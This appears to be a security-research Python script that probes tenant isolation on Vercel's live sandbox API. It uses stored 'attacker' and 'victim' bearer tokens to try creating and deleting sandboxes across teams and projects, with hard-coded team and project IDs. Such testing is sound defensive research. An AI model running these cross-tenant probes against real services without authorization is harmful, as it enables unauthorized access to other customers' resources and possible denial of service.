# -*- coding: utf-8 -*-
"""跨 team/project 创建隔离矩阵 (v45c)
所有测试至今都用正确 teamId/projectId, 错误组合从未测过:
P1: attacker token + victim team + victim project -> 能否创建到 victim 空间?
P2: attacker token + own team + victim project -> ?
P3: attacker token + victim team + own project -> ?
P4: victim token + DELETE attacker sandbox -> 跨租户 DoS?
P5: attacker token + 不存在 team -> ?"""
import json, sys, time, urllib.request, urllib.error
sys.path.insert(0, r'F:\scan\skills\non-traditional-vuln-hunting')
sys.stdout.reconfigure(encoding='utf-8')
from vercel_driver import api, TEAM, PROJ

TEAM_V = 'team_jnske5hDpDfj9eDG2PAfDqWf'
PROJ_V = 'prj_LX0QDsEAlWA0uRZvVTunSef3lllF'
NAME = 'matrix45'

def load_token(path):
    for ln in open(path, encoding='utf-8'):
        if ln.startswith('authorization=Bearer '):
            return ln.split('Bearer ')[1].strip()
    raise RuntimeError('no token in ' + path)

TOK_V = load_token(r'F:\scan\vercel_cookies2.txt')
TOK_A = load_token(r'F:\scan\vercel_cookies.txt')

def api_tok(tok, method, path, body=None, timeout=90):
    req = urllib.request.Request('https://api.vercel.com' + path, method=method)
    req.add_header('Authorization', 'Bearer ' + tok)
    req.add_header('Content-Type', 'application/json')
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:250]
    except Exception as e:
        return -1, 'EXC %s' % e

def mk_clean(tok, team, proj, name):
    api_tok(tok, 'DELETE', '/v2/sandboxes/%s?teamId=%s&projectId=%s' % (name, team, proj))
    time.sleep(2)

if __name__ == '__main__':
    mk_clean(TOK_A, TEAM, PROJ, NAME)
    mk_clean(TOK_V, TEAM_V, PROJ_V, NAME)
    time.sleep(3)
    print('=== P1: attacker token + victim team + victim project ===', flush=True)
    c, r = api_tok(TOK_A, 'POST', '/v4/sandboxes?teamId=%s' % TEAM_V, {"projectId": PROJ_V, "name": NAME}, 90)
    print('[P1] -> %d %s' % (c, (r or '')[:200]), flush=True)
    if c == 200:
        mk_clean(TOK_V, TEAM_V, PROJ_V, NAME)
        print('  (cleaned with victim token)', flush=True)

    print('=== P2: attacker token + own team + victim project ===', flush=True)
    c, r = api_tok(TOK_A, 'POST', '/v4/sandboxes?teamId=%s' % TEAM, {"projectId": PROJ_V, "name": NAME}, 90)
    print('[P2] -> %d %s' % (c, (r or '')[:200]), flush=True)
    if c == 200:
        mk_clean(TOK_A, TEAM, PROJ_V, NAME)
        print('  (cleaned)', flush=True)

    print('=== P3: attacker token + victim team + own project ===', flush=True)
    c, r = api_tok(TOK_A, 'POST', '/v4/sandboxes?teamId=%s' % TEAM_V, {"projectId": PROJ, "name": NAME}, 90)
    print('[P3] -> %d %s' % (c, (r or '')[:200]), flush=True)
    if c == 200:
        mk_clean(TOK_A, TEAM_V, PROJ, NAME)
        print('  (cleaned)', flush=True)

    print('=== P4: victim token + DELETE attacker sandbox ===', flush=True)
    # 先造一个 attacker sandbox
    c, r = api_tok(TOK_A, 'POST', '/v4/sandboxes?teamId=%s' % TEAM, {"projectId": PROJ, "name": NAME}, 90)
    print('[P4 setup] -> %d' % c, flush=True)
    time.sleep(3)
    c, r = api_tok(TOK_V, 'DELETE', '/v2/sandboxes/%s?teamId=%s&projectId=%s' % (NAME, TEAM_V, PROJ_V), timeout=90)
    print('[P4 victim DELETE] -> %d %s' % (c, (r or '')[:200]), flush=True)
    # 确认 attacker sandbox 还在
    c, r = api_tok(TOK_A, 'GET', '/v2/sandboxes/%s?teamId=%s&projectId=%s' % (NAME, TEAM, PROJ), timeout=90)
    print('[P4 verify] -> %d %s' % (c, (r or '')[:120]), flush=True)
    mk_clean(TOK_A, TEAM, PROJ, NAME)

    print('=== P5: attacker token + fake team ===', flush=True)
    c, r = api_tok(TOK_A, 'POST', '/v4/sandboxes?teamId=team_FAKE00000000000000000', {"projectId": PROJ, "name": NAME}, 90)
    print('[P5] -> %d %s' % (c, (r or '')[:200]), flush=True)
    print('DONE', flush=True)
